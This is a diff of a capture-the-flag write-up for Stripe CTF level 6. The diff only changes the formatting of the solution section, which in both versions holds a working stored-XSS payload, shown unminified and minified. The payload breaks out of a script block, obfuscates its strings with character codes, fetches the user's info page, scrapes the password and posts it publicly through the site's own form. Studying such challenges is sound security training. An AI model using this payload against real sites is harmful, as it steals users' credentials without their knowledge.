@@ -16,33 +16,34 @@ Fortunately for you, the Streamer engineers have decided to open-source their ap
 
 ### Solution
 
-#### Unminified Version:
+  * Unminified Version:
+  
+  ```javascript
+  }];
+  </script>
+  <script>
+    a = document.URL + String.fromCharCode(117, 115, 101, 114, 95, 105, 110, 102, 111); // 'user_info'
+    b = String.fromCharCode(35, 99, 111, 110, 116, 101, 110, 116);                      // '#content'
+    c = String.fromCharCode(35, 110, 101, 119, 95, 112, 111, 115, 116);                 // '#new_post'
+    $.get(a, function(data) {
+      var re = /<td>(.*)</g;
+      re.lastIndex = 0;
+      while (match = re.exec(data)) {
+        password = match[1];
+      }
+      if (password) {
+        $(b).val(escape(password));
+        $(c).submit();
+      }
+    });
+  </script>
+  <script>
+  ```
 
-```javascript
-}];
-</script>
-<script>
-  a = document.URL + String.fromCharCode(117, 115, 101, 114, 95, 105, 110, 102, 111); // 'user_info'
-  b = String.fromCharCode(35, 99, 111, 110, 116, 101, 110, 116);                      // '#content'
-  c = String.fromCharCode(35, 110, 101, 119, 95, 112, 111, 115, 116);                 // '#new_post'
-  $.get(a, function(data) {
-    var re = /<td>(.*)</g;
-    re.lastIndex = 0;
-    while (match = re.exec(data)) {
-      password = match[1];
-    }
-    if (password) {
-      $(b).val(escape(password));
-      $(c).submit();
-    }
-  });
-</script>
-<script>
-```
-
-#### Unminified Version:
-```javascript
-}];</script><script>a=document.URL+String.fromCharCode(117,115,101,114,95,105,110,102,111);b=String.fromCharCode(35,99,111,110,116,101,110,116);c=String.fromCharCode(35,110,101,119,95,112,111,115,116);$.get(a,function(data){var re=/<td>(.*)<\/td>/g;re.lastIndex=0;while(match=re.exec(data)){password=match[1]}if(password){$(b).val(escape(password));$(c).submit()}});</script><script>
-```
+  * Minified Version:
+  
+  ```javascript
+  }];</script><script>a=document.URL+String.fromCharCode(117,115,101,114,95,105,110,102,111);b=String.fromCharCode(35,99,111,110,116,101,110,116);c=String.fromCharCode(35,110,101,119,95,112,111,115,116);$.get(a,function(data){var re=/<td>(.*)<\/td>/g;re.lastIndex=0;while(match=re.exec(data)){password=match[1]}if(password){$(b).val(escape(password));$(c).submit()}});</script><script>
+  ```
 
 Originally posted at [https://stripe-ctf.com/levels/6](https://stripe-ctf.com/levels/6).
